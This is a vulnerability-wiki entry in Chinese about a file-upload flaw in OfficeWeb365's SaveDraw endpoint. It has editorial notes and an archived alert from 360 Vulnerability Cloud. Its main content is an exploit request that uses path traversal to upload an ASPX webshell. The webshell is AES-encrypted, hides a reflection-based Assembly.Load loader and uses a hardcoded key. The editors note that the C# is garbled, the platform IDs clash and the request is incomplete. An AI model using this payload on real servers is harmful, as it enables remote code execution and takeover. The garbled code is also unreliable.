---
source: "wy876漏洞文库镜像"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "OfficeWeb365 文件上传漏洞"
product: "OfficeWeb365 SaveDraw"
record_type: "vulnerability"
document_type: "文件上传PoC及监测消息转存"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "未知版本；path遍历/ASPX落地；IIS解析与服务写权限；无鉴权说明"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%A1%8C%E9%9D%A2%E8%BD%AF%E4%BB%B6/OfficeWeb365/OfficeWeb365%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
id: "vw-4576330d0ffaa32de9e8d32b"
entity_id: "ve-4576330d0ffaa32de9e8d32b"
schema_version: "1"
---

# OfficeWeb365 文件上传漏洞

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：OfficeWeb365 SaveDraw
- 文献类型：文件上传PoC及监测消息转存
- 版本、权限及部署边界：未知版本；path遍历/ASPX落地；IIS解析与服务写权限；无鉴权说明
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 与OfficeWeb SaveDraw篇同接口和前缀，ASPX/ASHX是载荷差异应保留关联，不算两漏洞
2. 360平台编号第一次00002453第二次0000245少一位，重复消息且升级平台语句疑转码错
3. C#关键字被大小写/空格破坏，byte与byte[]混淆、Decrypt和decryption不一致、assembly变量大小写错，按现状无法编译
4. Content-Length500817远大于展示内容、Host空且无落地访问/结果，不能作为完整复现
5. 仅360用户订阅入口不是公开原发现来源，底部GitHub镜像URL含中文非可核仓库，版本明确未知应保留

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文参考链接（未重新核验）：<https://loudongyun.360.cn/bug/list>
- 原文参考链接（未重新核验）：<https://github.com/wy876漏洞文库镜像>
- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

## OfficeWeb365 文件上传漏洞
【消息详情】：360漏洞云监测到网传《OfficeWeb365 远程代码执行漏洞》的消息，经漏洞云复核，确认为【真实】漏洞，漏洞影响【未知】版本，该漏洞标准化POC已经上传漏洞云情报平台，平台编号：360LDYLD-2023-00002453，情报订阅用户可登录漏洞云情报平台( https://loudongyun.360.cn/bug/list )查看漏洞详情。
360漏洞云监测到网传《OfficeWeb365远程代码执行漏洞》的消息，经漏洞云复核，确认为【真实】漏洞，漏洞影响【未知】版本，该漏洞标准化POC已经升级漏洞云情报平台，平台编号： 360LDYLD-2023-0000245
```
POST /PW/SaveDraw?path=../../Content/img&idx=1.aspx HTTP/1.1
Host: 
Content-Length: 500817
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4
Accept-Encoding: gzip, deflate

data:image/png;base64,01s34567890123456789y12345678901234567m91<% @ Page Language="C #"%>

<% @ Import namespace="System. Reflection"%>

<Script Run="Server">

Private byte decryption (byte data)

{

String key="e45e329feb5d925b";

Data=Convert. FromBase64String (System. Text. Encoding. UTF8. GetString (data));

System. Security. Cryptography. RijndaelManaged aes=new System. Security. Cryptography. RijndaelManaged();

Aes. Mode=System. Security. Cryptography. CipherMode. ECB;

Aes. Key=Encoding. UTF8. GetBytes (key);

Aes. Padding=System. Security. Cryptography. PaddingMode. PKCS7;

Return aes. CreateDecryptor(). TransformFinalBlock (data, 0, data. Length);

}

Private Byte Encryption (Byte Data)

{

String key="e45e329feb5d925b";

System. Security. Cryptography. RijndaelManaged aes=new System. Security. Cryptography. RijndaelManaged();

Aes. Mode=System. Security. Cryptography. CipherMode. ECB;

Aes. Key=Encoding. UTF8. GetBytes (key);

Aes. Padding=System. Security. Cryptography. PaddingMode. PKCS7;

Return System. Text. Encoding. UTF8. GetBytes (Convert. ToBase64String (aes. CreateEncryptor(). TransformFinalBlock (data, 0, data. Length)));

}

</Script>

<%

//Byte [] c=Request. BinaryRead (Request. ContentLength); Assembly. Load (Decrypt (c)). CreateInstance ("U"). Equals (this);

Byte [] c=Request. BinaryRead (Request. ContentLength);

String asname=System. Text. Encoding. ASCII. GetString (new byte [] {0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2e, 0x52, 0x65, 0x66, 0x6c, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x2e, 0x41, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79});

Type Assembly=Type. GetType (asname);

MethodInfo load=assembly. GetMethod ("Load", new Type [] {new byte [0]. GetType()});

Object obj=load. Invoke (null, new object [] {Decrypt (c)});

MethodInfo create=assembly. GetMethod ("CreateInstance", new Type [] {"". GetType()});

String name=System. Text. Encoding. ASCII. GetString (new byte [] {0x55});

Object pay=create. Invoke (obj, new object [] {name});

Pay. Equals (this);%>>---

```

---

> 来源：wy876漏洞文库镜像（https://github.com/wy876漏洞文库镜像）
